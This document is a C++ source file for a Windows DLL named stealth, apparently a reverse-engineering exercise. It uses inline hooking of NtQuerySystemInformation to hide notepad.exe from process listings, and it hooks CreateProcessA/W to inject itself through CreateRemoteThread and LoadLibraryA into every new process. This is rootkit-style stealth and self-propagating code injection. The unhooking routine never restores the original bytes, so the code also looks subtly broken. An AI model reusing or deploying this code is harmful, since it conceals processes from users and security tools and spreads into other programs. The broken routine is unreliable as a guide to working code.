// stealth.cpp : DLL 응용 프로그램을 위해 내보낸 함수를 정의합니다.
//

#include "stdafx.h"

BOOL enable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName, PROC pfnNew)
{
	FARPROC pFunc;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
	if (pFunc == NULL)
		return FALSE;
	pByte = (PBYTE)pFunc;
	if (pByte[0] == 0xE9)
		return FALSE;

	if (VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect) == NULL)
		return FALSE;

	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	memcpy(pFunc, pBuf, 5);

	if (VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect) == NULL)
		return FALSE;

	return TRUE;
}

BOOL disable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
	if (pFunc == NULL)
		return FALSE;
	pByte = (PBYTE)pFunc;
	if (pByte[0] != 0xE9)
		return FALSE;

	if (VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect) == NULL)
		return FALSE;

	if (VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect) == NULL)
		return FALSE;

	return TRUE;
}

BOOL injection(HANDLE hProc, char *szDllName)
{
	LPVOID pRemoteBuf = NULL;
	DWORD dwBufSize = strlen(szDllName) + sizeof(char);
	pRemoteBuf = VirtualAllocEx(hProc, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteBuf == NULL)
		return FALSE;

	if (WriteProcessMemory(hProc, pRemoteBuf, (LPVOID)szDllName, dwBufSize, NULL) == FALSE)
		return FALSE;

	FARPROC pThreadProc = NULL;
	pThreadProc = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (pThreadProc == NULL)
		return FALSE;

	if (CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuf, 0, NULL) == NULL)
		return FALSE;

	//if (WaitForSingleObject(hProc, INFINITE) == WAIT_FAILED)
	//	return FALSE;

	if (!VirtualFreeEx(hProc, pRemoteBuf, 0, MEM_RELEASE))
		return FALSE;

	if (!CloseHandle(hProc))
		return FALSE;

	return TRUE;
}

NTSTATUS NTAPI MyNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength OPTIONAL
	)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;

	disable_code_hooking(L"ntdll.dll", "NtQuerySystemInformation");
	pFunc = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (pFunc == NULL)
		return FALSE;

	status = ((PNTQUERYSYSTEMINFORMATION)pFunc)(
		SystemInformationClass, 
		SystemInformation,
		SystemInformationLength, 
		ReturnLength
		);

	if (status != 0x00000000L)	{	}
	else if (SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		pPrev = pCur;

		while (TRUE)
		{
			if (!_wcsicmp((PWSTR)pCur->Reserved2[1], L"notepad.exe"))
			{
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
			}
			else
				pPrev = pCur;

			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

	enable_code_hooking(L"ntdll.dll", "NtQuerySystemInformation", (PROC)MyNtQuerySystemInformation);

	return status;
}

BOOL WINAPI MyCreateProcessA(
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL bRetuen;
	FARPROC pFunc;

	disable_code_hooking(L"kernel32.dll", "CreateProcessA");

	pFunc = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateProcessA");
	if (pFunc == NULL)
		return FALSE;

	bRetuen = ((PCREATEPROCESSA)pFunc)(
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation
		);

	if (bRetuen)
		injection(lpProcessInformation->hProcess, "stealth.dll");

	enable_code_hooking(L"kernel32.dll", "CreateProcessA", (PROC)MyCreateProcessA);

	return bRetuen;
}

BOOL WINAPI MyCreateProcessW(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL bRetuen;
	FARPROC pFunc;

	disable_code_hooking(L"kernel32.dll", "CreateProcessW");

	pFunc = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateProcessW");
	if (pFunc == NULL)
		return FALSE;

	bRetuen = ((PCREATEPROCESSW)pFunc)(
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation
		);

	if (bRetuen)
		injection(lpProcessInformation->hProcess, "stealth.dll");

	enable_code_hooking(L"kernel32.dll", "CreateProcessW", (PROC)MyCreateProcessW);

	return bRetuen;
}
